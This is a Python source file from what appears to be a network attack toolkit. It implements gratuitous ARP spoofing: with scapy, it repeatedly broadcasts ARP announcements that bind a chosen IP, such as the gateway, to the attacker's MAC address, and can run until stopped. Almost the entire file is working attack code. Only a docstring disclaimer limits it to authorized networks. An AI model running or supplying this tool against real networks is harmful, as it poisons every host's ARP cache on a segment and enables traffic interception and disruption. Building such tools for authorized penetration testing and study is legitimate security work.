"""Gratuitous ARP spoofing: broadcast announcements that bind an IP to the attacker's MAC.

A gratuitous ARP is an unsolicited announcement: an ARP request whose sender and
target IP are the same address, sent to broadcast. Every host on the segment that
holds an entry for that IP may update it. Unlike ARP spoofing, no victim is chosen:
one announcement affects all hosts that cache the spoofed IP.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import (
    BROADCAST_MAC,
    Runner,
    read_interface_mac,
    run_command,
)

ZERO_MAC = "00:00:00:00:00:00"
ARP_REQUEST = 1


@dataclass(frozen=True)
class GratuitousArpConfig:
    iface: str                # attacker interface, on the segment
    spoofed_ip: str           # IP address to announce as its own, for example the gateway
    count: int = 0            # announcements to send; 0 = run until stopped
    interval: float = 2.0     # seconds between announcements
    dry_run: bool = False     # build announcements but do not send them

    def __post_init__(self) -> None:
        parse_ipv4(self.spoofed_ip, "spoofed IP")


@dataclass
class GratuitousArpStats:
    frames: int = 0
    sender_mac: str = ""


def build_gratuitous_arp(sender_mac: str, spoofed_ip: str) -> Packet:
    """Broadcast ARP request with sender and target IP both `spoofed_ip`."""
    return Ether(src=sender_mac, dst=BROADCAST_MAC) / ARP(
        op=ARP_REQUEST,
        hwsrc=sender_mac,
        psrc=spoofed_ip,
        hwdst=ZERO_MAC,
        pdst=spoofed_ip,
    )


def run_gratuitous_arp(
    config: GratuitousArpConfig,
    stop_event: threading.Event,
    on_progress: Callable[[GratuitousArpStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> GratuitousArpStats:
    """Broadcast gratuitous ARP announcements until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp
    sender_mac = read_interface_mac(config.iface, run)
    spoofed = parse_ipv4(config.spoofed_ip, "spoofed IP")

    stats = GratuitousArpStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_gratuitous_arp(sender_mac, spoofed)
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
